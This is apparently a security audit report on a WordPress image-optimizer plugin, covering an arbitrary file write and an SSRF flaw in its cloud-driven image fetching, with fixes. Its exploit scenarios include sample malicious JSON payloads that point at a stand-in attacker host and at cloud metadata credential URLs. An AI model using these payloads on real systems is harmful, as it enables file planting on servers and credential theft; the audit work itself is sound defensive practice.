## Batch C — Optimizers

### Finding: Arbitrary file write via unbounded local path from cloud response: `src/optimax.cls.php:462`
- Severity: MEDIUM
- Confidence: 0.85
- Description: `Optimax::_save_imgs()` iterates `$json['data_optimax']['imgs']` from the QC.cloud response and, for each entry, calls `_fetch_img($img['webp_url'], $local_path . '.webp')` / `.avif`. `$local_path` is `Utility::is_internal_file($img['src'])[0]`, which is the `realpath()` of `$_SERVER['DOCUMENT_ROOT'] . $url_parsed['path']` for any URL whose host matches `Utility::internal()`/`CDN::internal()`. There is no anchor check confining the result under `LITESPEED_STATIC_DIR` / wp-content / a plugin cache dir. A QC.cloud response (or a MITM thereof — see SSRF finding below) can therefore set `src` to `https://<site-host>/wp-config.php` (or any existing docroot-resident file) and have `File::save()` write attacker-controlled HTTP body bytes to `<existing-file>.webp` / `.avif` anywhere under the document root, including alongside sensitive files like `.htaccess`, `wp-config.php`, plugin entry points, etc.
- Exploit Scenario: Attacker who (a) controls a compromised QC.cloud response, or (b) MITMs the upstream image fetch (trivial because `_fetch_img` sets `sslverify => false`, line 447), returns `{"data_optimax":{"imgs":[{"src":"https://victim/wp-config.php","webp_url":"http://attacker/payload.bin"}]}}`. The site then writes the attacker payload to `/var/www/html/wp-config.php.webp`. Repeating with any reachable file in the docroot lets the attacker plant arbitrary bytes at arbitrary `<existing>.webp` / `.avif` paths on the server filesystem. Trust tier required: external upstream (compromised cloud) or network adjacency (MITM, made viable by the disabled cert check on the second hop).
- Trust boundary crossed: `_send_req()` (which trusts the cloud JSON shape) -> `_save_imgs()` -> `_fetch_img()` / `File::save()`. The nearest-to-sink function (`_save_imgs`) never re-validates that `is_internal_file($src)[0]` lives under a known cache root, and `File::save()` itself does not constrain its `$filename` argument.
- Recommendation: After resolving `$local_path = is_internal_file($img['src'])[0]`, assert `strpos($local_path, realpath(WP_CONTENT_DIR) . DIRECTORY_SEPARATOR) === 0` (or a tighter allowlist of upload/static dirs) before composing the save path; refuse any `$local_path` whose canonical form escapes that prefix. Independently, enable `sslverify` on `_fetch_img()` so the second hop cannot be MITM'd.

### Finding: SSRF via unvalidated host in cloud-driven image fetch: `src/optimax.cls.php:443`
- Severity: MEDIUM
- Confidence: 0.8
- Description: `_fetch_img()` issues `wp_remote_get($url, ['sslverify' => false, ...])` where `$url` is `$img['webp_url']` / `$img['avif_url']` lifted directly out of the QC.cloud response body. The host and protocol are not constrained to QC.cloud, the CDN allowlist, or the site itself — any string the response supplies (`http://169.254.169.254/...`, internal LAN hosts, etc.) is dispatched. Per the trust contract ("URLs must originate from plugin code or already-validated options"), this is an attacker-controllable host if the cloud channel is compromised or MITM'd (note `sslverify => false` on the *outbound* image hop, line 447).
- Exploit Scenario: Attacker controlling the upstream response (compromised QC account, malicious mirror, or on-path attacker exploiting the disabled cert check on `_fetch_img`'s own outbound hop) returns `{"data_optimax":{"imgs":[{"src":"https://<site>/existing.jpg","webp_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"}]}}`. The WordPress host fetches the internal/metadata URL with site network context and writes the response body to disk under `<existing>.webp` (see paired finding). Repeating against intranet hosts (`http://10.x.x.x/admin`, `http://localhost:8500/v1/kv/...`) yields internal recon and credential theft.
- Trust boundary crossed: `Cloud::post()` JSON response (semi-trusted external) -> `_save_imgs()` -> `_fetch_img()`. The host of `$img['webp_url']`/`$img['avif_url']` is never compared against an allowlist, and `wp_remote_get()` is the nearest sink with no host check immediately before it.
- Recommendation: Before calling `wp_remote_get`, parse the URL and enforce an allowlist (e.g., `wp_parse_url($url, PHP_URL_HOST)` must equal a known QC.cloud / CDN host or the site's own host) and require `https` for the scheme. Additionally restore `sslverify => true` so a network attacker cannot inject the malicious URL via on-path tampering in the first place.
